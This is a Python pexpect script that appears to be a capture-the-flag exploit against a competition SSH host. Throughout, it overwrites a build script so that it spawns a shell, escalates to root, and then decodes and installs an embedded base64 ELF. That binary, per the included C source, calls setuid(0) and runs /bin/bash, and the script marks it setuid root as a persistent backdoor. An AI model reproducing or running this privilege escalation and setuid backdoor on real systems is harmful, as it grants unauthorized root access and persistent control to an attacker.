import pexpect
k = "ssh 00000000d73ca17577d58485@broker.cscg19.nexantic.net"
c = pexpect.spawn(k)
c.expect('.*$.*',timeout=None)
print("JO")
c.sendline('mv /opt/build-input/run.sh /opt/build-input/run.sh.bak')
c.expect('.*$.*',timeout=None)
def write(content, to,d):
    c.sendline('cat <<":q" >> %s'%to)
    for j in content.splitlines():
        c.expect('>',timeout=None)
        c.sendline(j)
    c.sendline(":q")
    c.expect('.*%s.*'%(d),timeout=None)
script='''#!/bin/bash
bash'''
write(script,'/opt/build-input/run.sh','$')
c.sendline("chmod +x /opt/build-input/run.sh")
c.expect('.*#.*',timeout=None)
c.sendline("./build.sh")
c.expect('.*#.*',timeout=None)

'''
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
void main()
{
  setuid(0);
  const char* cmd = "/bin/bash";
  system(cmd);
}
'''

payload = '''f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA0AUAAAAAAABAAAAAAAAAADgaAAAAAAAAAAAAAEAAOAAJ
AEAAHwAeAAYAAAAFAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCAAAAAAAAOAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwJAAAAAAAADAkAAAAAAAAAACAA
AAAAAAEAAAAGAAAA2A0AAAAAAADYDSAAAAAAANgNIAAAAAAAYAIAAAAAAABoAgAAAAAAAAAAIAAA
AAAAAgAAAAYAAADwDQAAAAAAAPANIAAAAAAA8A0gAAAAAADgAQAAAAAAAOABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAIAAAAAAABUAgAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAAwAcAAAAAAADABwAAAAAAAMAHAAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA
UeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS
5XRkBAAAANgNAAAAAAAA2A0gAAAAAADYDSAAAAAAACgCAAAAAAAAKAIAAAAAAAABAAAAAAAAAC9s
aWI2NC9sZC1saW51eC14ODYtNjQuc28uMgAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAAIAAA
AAQAAAAUAAAAAwAAAEdOVQDl/TyDAurYpzAOPNGWnKvNGPd4YQEAAAABAAAAAQAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOgAAACAAAAAAAAAAAAAAAAAAAAAA
AAAAEgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAKAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAVgAAACAA
AAAAAAAAAAAAAAAAAAAAAAAAZQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAeQAAACAAAAAAAAAAAAAA
AAAAAAAAAAAACwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAGQAAACIAAAAAAAAAAAAAAAAAAAAAAAAA
AGxpYmMuc28uNgBzZXR1aWQAc3lzdGVtAF9fY3hhX2ZpbmFsaXplAF9fbGliY19zdGFydF9tYWlu
AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2dtb25fc3RhcnRfXwBfSnZfUmVnaXN0ZXJD
bGFzc2VzAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAR0xJQkNfMi4yLjUAAAAAAAACAAIAAAAA
AAAAAgACAAAAAAAAAAEAAQABAAAAEAAAAAAAAAB1GmkJAAACAJMAAAAAAAAA2A0gAAAAAAAIAAAA
AAAAANAGAAAAAAAA4A0gAAAAAAAIAAAAAAAAAJAGAAAAAAAAMBAgAAAAAAAIAAAAAAAAADAQIAAA
AAAA0A8gAAAAAAAGAAAAAQAAAAAAAAAAAAAA2A8gAAAAAAAGAAAAAwAAAAAAAAAAAAAA4A8gAAAA
AAAGAAAABAAAAAAAAAAAAAAA6A8gAAAAAAAGAAAABQAAAAAAAAAAAAAA8A8gAAAAAAAGAAAABgAA
AAAAAAAAAAAA+A8gAAAAAAAGAAAACAAAAAAAAAAAAAAAGBAgAAAAAAAHAAAAAgAAAAAAAAAAAAAA
IBAgAAAAAAAHAAAABwAAAAAAAAAAAAAASIPsCEiLBWUKIABIhcB0Av/QSIPECMMAAAAAAAAAAAD/
NXIKIAD/JXQKIAAPH0AA/yVyCiAAaAAAAADp4P////8lagogAGgBAAAA6dD/////JTIKIABmkAAA
AAAAAAAAMe1JidFeSIniSIPk8FBUTI0FugEAAEiNDUMBAABIjT0MAQAA/xXeCSAA9A8fRAAASI09
MQogAEiNBTEKIABVSCn4SInlSIP4DnYVSIsFrgkgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QA
AAAAAEiNPfEJIABIjTXqCSAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWBCSAASIXAdAxd
/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD2hCSAAAHUnSIM9VwkgAABVSInldAxIiz2CCSAA
6A3////oSP///13GBXgJIAAB88MPH0AAZi4PH4QAAAAAAEiNPREHIABIgz8AdQvpXv///2YPH0QA
AEiLBfkIIABIhcB06VVIieX/0F3pQP///1VIieVIg+wQvwAAAADonv7//0iNBZsAAABIiUX4SItF
+EiJx+h3/v//kMnDDx9AAEFXQVZBif9BVUFUTI0llgYgAFVIjS2WBiAAU0mJ9kmJ1Uwp5UiD7AhI
wf0D6A/+//9Ihe10IDHbDx+EAAAAAABMiepMifZEif9B/xTcSIPDAUg53XXqSIPECFtdQVxBXUFe
QV/DkGYuDx+EAAAAAADzwwAASIPsCEiDxAjDAAAAAQACAC9iaW4vYmFzaAAAAAEbAzs8AAAABgAA
AND9//+IAAAAAP7//7AAAAAQ/v//WAAAAED////IAAAAcP///+gAAADg////MAEAAAAAAAAUAAAA
AAAAAAF6UgABeBABGwwHCJABBxAUAAAAHAAAALD9//8rAAAAAAAAAAAAAAAUAAAAAAAAAAF6UgAB
eBABGwwHCJABAAAkAAAAHAAAAED9//8wAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQA
AABI/f//CAAAAAAAAAAAAAAAHAAAAFwAAABw/v//LAAAAABBDhCGAkMNBmcMBwgAAABEAAAAfAAA
AID+//9lAAAAAEIOEI8CQg4YjgNFDiCNBEIOKIwFSA4whgZIDjiDB00OQHIOOEEOMEEOKEIOIEIO
GEIOEEIOCAAUAAAAxAAAAKj+//8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAANAGAAAAAAAAkAYAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAMAAAAAAAA
AHAFAAAAAAAADQAAAAAAAACkBwAAAAAAABkAAAAAAAAA2A0gAAAAAAAbAAAAAAAAAAgAAAAAAAAA
GgAAAAAAAADgDSAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAJgCAAAAAAAABQAAAAAAAACQ
AwAAAAAAAAYAAAAAAAAAuAIAAAAAAAAKAAAAAAAAAJ8AAAAAAAAACwAAAAAAAAAYAAAAAAAAABUA
AAAAAAAAAAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAAAwAAAAAAAAABQAAAAAAAAABwAA
AAAAAAAXAAAAAAAAAEAFAAAAAAAABwAAAAAAAABoBAAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAA
AAAAABgAAAAAAAAA+///bwAAAAAAAAAIAAAAAP7//28AAAAASAQAAAAAAAD///9vAAAAAAEAAAAA
AAAA8P//bwAAAAAwBAAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPANIAAAAAAA
AAAAAAAAAAAAAAAAAAAAAKYFAAAAAAAAtgUAAAAAAAAAAAAAAAAAADAQIAAAAAAAR0NDOiAoRGVi
aWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAMAAQA4AgAAAAAAAAAAAAAAAAAAAAAAAAMAAgBUAgAAAAAAAAAAAAAAAAAAAAAA
AAMAAwB0AgAAAAAAAAAAAAAAAAAAAAAAAAMABACYAgAAAAAAAAAAAAAAAAAAAAAAAAMABQC4AgAA
AAAAAAAAAAAAAAAAAAAAAAMABgCQAwAAAAAAAAAAAAAAAAAAAAAAAAMABwAwBAAAAAAAAAAAAAAA
AAAAAAAAAAMACABIBAAAAAAAAAAAAAAAAAAAAAAAAAMACQBoBAAAAAAAAAAAAAAAAAAAAAAAAAMA
CgBABQAAAAAAAAAAAAAAAAAAAAAAAAMACwBwBQAAAAAAAAAAAAAAAAAAAAAAAAMADACQBQAAAAAA
AAAAAAAAAAAAAAAAAAMADQDABQAAAAAAAAAAAAAAAAAAAAAAAAMADgDQBQAAAAAAAAAAAAAAAAAA
AAAAAAMADwCkBwAAAAAAAAAAAAAAAAAAAAAAAAMAEACwBwAAAAAAAAAAAAAAAAAAAAAAAAMAEQDA
BwAAAAAAAAAAAAAAAAAAAAAAAAMAEgAACAAAAAAAAAAAAAAAAAAAAAAAAAMAEwDYDSAAAAAAAAAA
AAAAAAAAAAAAAAMAFADgDSAAAAAAAAAAAAAAAAAAAAAAAAMAFQDoDSAAAAAAAAAAAAAAAAAAAAAA
AAMAFgDwDSAAAAAAAAAAAAAAAAAAAAAAAAMAFwDQDyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAECAA
AAAAAAAAAAAAAAAAAAAAAAMAGQAoECAAAAAAAAAAAAAAAAAAAAAAAAMAGgA4ECAAAAAAAAAAAAAA
AAAAAAAAAAMAGwAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEA
FQDoDSAAAAAAAAAAAAAAAAAAGQAAAAIADgAABgAAAAAAAAAAAAAAAAAAGwAAAAIADgBABgAAAAAA
AAAAAAAAAAAALgAAAAIADgCQBgAAAAAAAAAAAAAAAAAARAAAAAEAGgA4ECAAAAAAAAEAAAAAAAAA
UwAAAAEAFADgDSAAAAAAAAAAAAAAAAAAegAAAAIADgDQBgAAAAAAAAAAAAAAAAAAhgAAAAEAEwDY
DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAA
AAAAAAAArAAAAAEAEgAICQAAAAAAAAAAAAAAAAAAugAAAAEAFQDoDSAAAAAAAAAAAAAAAAAAAAAA
AAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAAAEwDgDSAAAAAAAAAAAAAAAAAA1wAAAAEAFgDwDSAA
AAAAAAAAAAAAAAAA4AAAAAAAEwDYDSAAAAAAAAAAAAAAAAAA8wAAAAAAEQDABwAAAAAAAAAAAAAA
AAAABgEAAAEAGAAAECAAAAAAAAAAAAAAAAAAHAEAABIADgCgBwAAAAAAAAIAAAAAAAAALAEAACAA
AAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAGQAoECAAAAAAAAAAAAAAAAAASAEAABAAGQA4ECAAAAAA
AAAAAAAAAAAAJgEAABIADwCkBwAAAAAAAAAAAAAAAAAATwEAABIAAAAAAAAAAAAAAAAAAAAAAAAA
YwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAggEAABAAGQAoECAAAAAAAAAAAAAAAAAAjwEAACAAAAAA
AAAAAAAAAAAAAAAAAAAAngEAABECGQAwECAAAAAAAAAAAAAAAAAAqwEAABEAEACwBwAAAAAAAAQA
AAAAAAAAugEAABIADgAwBwAAAAAAAGUAAAAAAAAA0gAAABAAGgBAECAAAAAAAAAAAAAAAAAAiAEA
ABIADgDQBQAAAAAAACsAAAAAAAAAygEAABAAGgA4ECAAAAAAAAAAAAAAAAAA1gEAABIADgAABwAA
AAAAACwAAAAAAAAA2wEAACAAAAAAAAAAAAAAAAAAAAAAAAAA7wEAABECGQA4ECAAAAAAAAAAAAAA
AAAA+wEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAKQIAACIA
AAAAAAAAAAAAAAAAAAAAAAAAxAEAABIACwBwBQAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19K
Q1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21w
bGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9k
dW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAdGVzdC5jAF9fRlJBTUVfRU5EX18A
X19KQ1JfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlOQU1JQwBfX2luaXRfYXJyYXlfc3RhcnQA
X19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkA
X0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9lZGF0YQBzeXN0ZW1AQEdMSUJDXzIuMi41AF9f
bGliY19zdGFydF9tYWluQEBHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18A
X19kc29faGFuZGxlAF9JT19zdGRpbl91c2VkAF9fbGliY19jc3VfaW5pdABfX2Jzc19zdGFydABt
YWluAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19UTUNfRU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVU
YWJsZQBzZXR1aWRAQEdMSUJDXzIuMi41AF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQAALnN5
bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLkFCSS10YWcALm5vdGUuZ251LmJ1
aWxkLWlkAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lv
bl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0
YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5k
eW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAAQAA
AAIAAAAAAAAAOAIAAAAAAAA4AgAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
IwAAAAcAAAACAAAAAAAAAFQCAAAAAAAAVAIAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAA
AAAAAAAAADEAAAAHAAAAAgAAAAAAAAB0AgAAAAAAAHQCAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQA
AAAAAAAAAAAAAAAAAABEAAAA9v//bwIAAAAAAAAAmAIAAAAAAACYAgAAAAAAABwAAAAAAAAABQAA
AAAAAAAIAAAAAAAAAAAAAAAAAAAATgAAAAsAAAACAAAAAAAAALgCAAAAAAAAuAIAAAAAAADYAAAA
AAAAAAYAAAABAAAACAAAAAAAAAAYAAAAAAAAAFYAAAADAAAAAgAAAAAAAACQAwAAAAAAAJADAAAA
AAAAnwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABeAAAA////bwIAAAAAAAAAMAQAAAAA
AAAwBAAAAAAAABIAAAAAAAAABQAAAAAAAAACAAAAAAAAAAIAAAAAAAAAawAAAP7//28CAAAAAAAA
AEgEAAAAAAAASAQAAAAAAAAgAAAAAAAAAAYAAAABAAAACAAAAAAAAAAAAAAAAAAAAHoAAAAEAAAA
AgAAAAAAAABoBAAAAAAAAGgEAAAAAAAA2AAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAGAAAAAAAAACE
AAAABAAAAEIAAAAAAAAAQAUAAAAAAABABQAAAAAAADAAAAAAAAAABQAAABgAAAAIAAAAAAAAABgA
AAAAAAAAjgAAAAEAAAAGAAAAAAAAAHAFAAAAAAAAcAUAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAA
AAAAAAAAAAAAAAAAAIkAAAABAAAABgAAAAAAAACQBQAAAAAAAJAFAAAAAAAAMAAAAAAAAAAAAAAA
AAAAABAAAAAAAAAAEAAAAAAAAACUAAAAAQAAAAYAAAAAAAAAwAUAAAAAAADABQAAAAAAAAgAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAnQAAAAEAAAAGAAAAAAAAANAFAAAAAAAA0AUAAAAA
AADSAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAKMAAAABAAAABgAAAAAAAACkBwAAAAAA
AKQHAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAA
sAcAAAAAAACwBwAAAAAAAA4AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAsQAAAAEAAAAC
AAAAAAAAAMAHAAAAAAAAwAcAAAAAAAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAL8A
AAABAAAAAgAAAAAAAAAACAAAAAAAAAAIAAAAAAAADAEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
AAAAAADJAAAADgAAAAMAAAAAAAAA2A0gAAAAAADYDQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAgAAAAAAAAA1QAAAA8AAAADAAAAAAAAAOANIAAAAAAA4A0AAAAAAAAIAAAAAAAAAAAAAAAA
AAAACAAAAAAAAAAIAAAAAAAAAOEAAAABAAAAAwAAAAAAAADoDSAAAAAAAOgNAAAAAAAACAAAAAAA
AAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADmAAAABgAAAAMAAAAAAAAA8A0gAAAAAADwDQAAAAAA
AOABAAAAAAAABgAAAAAAAAAIAAAAAAAAABAAAAAAAAAAmAAAAAEAAAADAAAAAAAAANAPIAAAAAAA
0A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAO8AAAABAAAAAwAAAAAAAAAA
ECAAAAAAAAAQAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD4AAAAAQAAAAMA
AAAAAAAAKBAgAAAAAAAoEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA/gAA
AAgAAAADAAAAAAAAADgQIAAAAAAAOBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA
AAAAAAMBAAABAAAAMAAAAAAAAAAAAAAAAAAAADgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAA
AAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABoEAAAAAAAAHgGAAAAAAAAHQAAAC8A
AAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA4BYAAAAAAABFAgAAAAAA
AAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAACUZAAAAAAAA
DAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
'''
write(payload,'/work/tmp','#')
c.sendline('base64 -d /work/tmp > /work/rootme')
c.expect('.*#.*',timeout=None)
c.sendline('rm -rf /work/tmp')
c.expect('.*#.*',timeout=None)
c.sendline('chown root /work/rootme')
c.expect('.*#.*',timeout=None)
c.sendline('chmod +s+x /work/rootme')
c.expect('.*#.*',timeout=None)
c.sendline('exit')
c.expect('.*$.*',timeout=None)
c.sendline('/opt/build-input/rootme')
c.interact()
